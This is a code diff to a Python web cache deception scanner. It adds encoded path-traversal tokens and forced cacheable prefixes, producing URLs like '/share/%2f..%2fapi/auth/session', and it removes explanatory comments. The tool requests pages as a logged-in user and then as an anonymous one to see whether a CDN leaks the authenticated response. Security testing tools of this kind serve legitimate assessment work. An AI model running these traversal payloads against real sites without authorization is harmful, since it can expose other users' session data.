@@ -16,12 +16,12 @@ from tqdm import tqdm
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
 
-# --- Constants ---
-
 DEFAULT_DELIMITERS = ['!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`', '{', '|', '}', '~', '%21', '%22', '%23', '%24', '%25', '%26', '%27', '%28', '%29', '%2A', '%2B', '%2C', '%2D', '%2E', '%2F', '%3A', '%3B', '%3C', '%3D', '%3E', '%3F', '%40', '%5B', '%5C', '%5D', '%5E', '%5F', '%60', '%7B', '%7C', '%7D', '%7E', '%0A', '%0A%0D', '%0D']
 DEFAULT_EXTENSIONS = ['.js', '.css', '.png', '.jpg', '.html']
 MAX_THREADS = 10
 REQUEST_TIMEOUT = 15
+
+OSN_TRAVERSAL_TOKENS = ['..%2f', '%2f..%2f', '%2e%2e%2f', '%2f%2e%2e%2f']
 
 CACHE_HEADER_NAMES = [
     'X-Cache', 'Cf-Cache-Status', 'X-Cache-Status', 'X-Vercel-Cache',
@@ -213,24 +213,41 @@ def extract_static_directories(response_text: str, url: str, headers: Dict[str, 
     return static_dirs
 
 
-def create_osn_test_urls(base_url: str, static_dirs: Set[str], recursion_depth: int) -> Set[str]:
+def create_osn_test_urls(base_url: str, static_dirs: Set[str], recursion_depth: int,
+                         cache_dirs: Optional[List[str]] = None) -> Set[str]:
     parsed = urllib.parse.urlparse(base_url)
     original_path = parsed.path.strip('/')
+    origin = f"{parsed.scheme}://{parsed.netloc}"
     urls: Set[str] = set()
-    rand = generate_random_chars()
-    urls.add(f"{parsed.scheme}://{parsed.netloc}/..%2f{original_path}?{rand}")
+
+    def emit(prefix: str) -> None:
+        # prefix is a path with no leading/trailing slashes ('share', 'api/public', or '').
+        # Emits {origin}/{prefix}/{token}{sensitive_path} for every traversal variant.
+        for tok in OSN_TRAVERSAL_TOKENS:
+            rand = generate_random_chars()
+            if prefix:
+                urls.add(f"{origin}/{prefix}/{tok}{original_path}?{rand}")
+            else:
+                urls.add(f"{origin}/{tok}{original_path}?{rand}")
+
+    # Root traversal (no cacheable prefix).
+    emit('')
+
+    # Explicit cacheable prefixes (wildcard cache rules) — used verbatim at full
+    # depth. This is the ChatGPT/Harel pattern: /share/%2f..%2fapi/auth/session.
+    for cd in (cache_dirs or []):
+        emit(cd.strip('/'))
+
+    # Auto-discovered static directories.
     if recursion_depth == 1:
         base_dirs = {parts[0] for d in static_dirs if (parts := [p for p in d.split('/') if p])}
         for bd in base_dirs:
-            rand = generate_random_chars()
-            urls.add(f"{parsed.scheme}://{parsed.netloc}/{bd}/..%2f{original_path}?{rand}")
+            emit(bd)
     else:
         for d in static_dirs:
             parts = [p for p in d.split('/') if p]
             for i in range(min(recursion_depth, len(parts))):
-                cur = '/'.join(parts[:i + 1])
-                rand = generate_random_chars()
-                urls.add(f"{parsed.scheme}://{parsed.netloc}/{cur}/..%2f{original_path}?{rand}")
+                emit('/'.join(parts[:i + 1]))
     return urls
 
 
@@ -338,9 +355,6 @@ def check_cache_behavior(vector: Dict, auth_headers: Dict[str, str], proxies: Di
     }
 
     try:
-        # Request B: authenticated must fire FIRST so the CDN caches the auth
-        # response. If an anon request went first, the CDN would cache the
-        # login redirect and every subsequent auth request would hit that 302.
         auth_req = ua.copy()
         auth_req.update(auth_headers)
         if override_header and override_value:
@@ -392,16 +406,10 @@ def check_cache_behavior(vector: Dict, auth_headers: Dict[str, str], proxies: Di
 
         anon_retry_body = resp_c.text
 
-        # Endpoint is simply public — not a leak
         if baseline_body and baseline_body == auth_body:
             debug['note'] = 'public endpoint (baseline == B)'
             return url, False, debug, False
 
-        # PHO false-positive filter: paths like /robots.txt and /favicon.ico are
-        # often already cached with their real content, which would match B and
-        # look like a leak even when the override was ignored. Fetch the same
-        # path with a cache-buster query to get an origin-fresh response; if B
-        # matches that, the override did nothing.
         if override_header and override_value:
             parsed_u = urllib.parse.urlparse(url)
             cb_sep = '&' if parsed_u.query else '?'
@@ -430,17 +438,14 @@ def check_cache_behavior(vector: Dict, auth_headers: Dict[str, str], proxies: Di
         cache_b = debug['B_cache']
         any_signal = cache_c['has_signal'] or cache_b['has_signal']
 
-        # Primary: cache HIT on anon retry AND body/marker match
         if cache_c['is_hit'] and (bodies_match or sim > 0.95 or leaked):
             debug['verdict_reason'] = 'cache_hit + body/marker match'
             return url, True, debug, False
 
-        # Marker leak — strong signal even without cache header
         if leaked and (bodies_match or sim > 0.9):
             debug['verdict_reason'] = 'marker leak'
             return url, True, debug, False
 
-        # Heuristic: no cache headers but cacheable Cache-Control + body match
         if not any_signal and bodies_match and is_cacheable_response(debug['B_cc']):
             debug['verdict_reason'] = 'heuristic (cacheable cc + body match, no cache header)'
             return url, True, debug, False
@@ -483,6 +488,11 @@ def main():
                         help='Comma-separated extensions for PD (default: .js,.css,.png)')
     parser.add_argument('-s', '--static-files', default='',
                         help='Comma-separated extra static files/paths for FNCR and PHO')
+    parser.add_argument('--cache-dirs', default='',
+                        help='Comma-separated cacheable path prefixes / wildcard cache rules to force\n'
+                             'into OSN, e.g. /share,/api/public. Tests {prefix}/<traversal><sensitive>\n'
+                             '(the ChatGPT/Harel wildcard cache-deception pattern). Runs even if no\n'
+                             'static dirs are auto-discovered.')
     parser.add_argument('-T', '--technique', choices=['pd', 'osn', 'csn', 'fncr', 'pho'],
                         help="""Run one specific technique (default: all):
   pd   — Path Delimiters
@@ -525,6 +535,9 @@ def main():
     print(f"[*] Cache headers watched: {len(CACHE_HEADER_NAMES)}")
 
     static_files = [f.strip() for f in args.static_files.split(',') if f.strip()]
+    cache_dirs = [d.strip() for d in args.cache_dirs.split(',') if d.strip()]
+    if cache_dirs:
+        print(f"[*] Forced OSN cache prefixes: {cache_dirs}")
 
     sensitive_path = args.sensitive_path or urllib.parse.urlparse(args.url).path or '/'
 
@@ -581,12 +594,12 @@ def main():
                 except requests.exceptions.RequestException as e:
                     print(f"[!] Init request failed: {e}")
                     continue
-            if static_dirs:
-                if tech == 'osn':
-                    urls = create_osn_test_urls(args.url, static_dirs, args.r)
-                else:
-                    delimiters = read_delimiters(args.wordlist) if args.wordlist else DEFAULT_DELIMITERS
-                    urls = create_csn_test_urls(args.url, static_dirs, delimiters, args.r)
+            if tech == 'osn' and (static_dirs or cache_dirs):
+                urls = create_osn_test_urls(args.url, static_dirs or set(), args.r, cache_dirs)
+                vectors = [{'url': u} for u in urls]
+            elif tech == 'csn' and static_dirs:
+                delimiters = read_delimiters(args.wordlist) if args.wordlist else DEFAULT_DELIMITERS
+                urls = create_csn_test_urls(args.url, static_dirs, delimiters, args.r)
                 vectors = [{'url': u} for u in urls]
 
         elif tech == 'fncr':
